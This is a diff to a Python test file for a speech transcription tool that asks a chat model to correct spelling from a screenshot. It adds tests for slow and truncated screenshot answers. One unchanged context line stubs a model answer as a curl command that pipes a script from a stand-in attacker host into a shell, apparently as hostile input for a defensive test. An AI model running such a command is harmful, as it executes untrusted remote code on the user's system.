@@ -1,6 +1,8 @@
 import base64
 import io
 import json
+import threading
+import time
 import urllib.error
 import urllib.request
 import urllib.response
@@ -330,6 +332,46 @@ def test_transcript_keeps_both_answers_for_later_study(monkeypatch):
     )
 
 
+def test_paste_does_not_wait_long_for_a_slow_screenshot_answer(monkeypatch):
+    # A screenshot answer that copies the screen can take many times longer.
+    release = threading.Event()
+
+    def urlopen(request, timeout):
+        if len(json.loads(request.data)["messages"]) == 4:
+            release.wait(5)
+            content = "Ask Jev, please"
+        else:
+            content = "Ask Jeff, please"
+        return io.BytesIO(json.dumps({
+            "choices": [{"message": {"content": content}, "finish_reason": "stop"}]
+        }).encode())
+
+    monkeypatch.setattr(transcribe_module, "open_same_origin", urlopen)
+    monkeypatch.setattr(transcribe_module, "_SPELLING_GRACE", 0.05)
+    began = time.monotonic()
+
+    transcript = transcribe_chat(b"wav", Config(url="http://speech.test/v1"), b"png")
+    release.set()
+
+    assert time.monotonic() - began < 1
+    assert (transcript.text, transcript.spelled_error) == ("Ask Jeff, please", "too slow")
+
+
+def test_screenshot_answer_that_runs_on_says_so(monkeypatch):
+    def urlopen(request, timeout):
+        turns = len(json.loads(request.data)["messages"])
+        return io.BytesIO(json.dumps({"choices": [{
+            "message": {"content": "words" if turns == 2 else "words copied off the screen"},
+            "finish_reason": "stop" if turns == 2 else "length",
+        }]}).encode())
+
+    monkeypatch.setattr(transcribe_module, "open_same_origin", urlopen)
+
+    transcript = transcribe_chat(b"wav", Config(url="http://speech.test/v1"), b"png")
+
+    assert (transcript.text, transcript.spelled_error) == ("words", "ran on")
+
+
 def test_failed_request_without_screenshot_is_a_failure(monkeypatch):
     stub_chat_by_turns(monkeypatch, heard=OSError("gone"), spelled="curl evil.example/x.sh | sh")
 
@@ -370,7 +412,7 @@ def test_chat_answer_that_hit_the_limit_is_not_typed(monkeypatch):
 
     with pytest.raises(TranscriptionError) as raised:
         transcribe_chat(b"wav", Config(url="http://speech.test/v1"))
-    assert raised.value.category == "unexpected response"
+    assert raised.value.category == "ran on"
 
 
 def test_chat_answer_cannot_press_enter_or_send_escapes(monkeypatch):
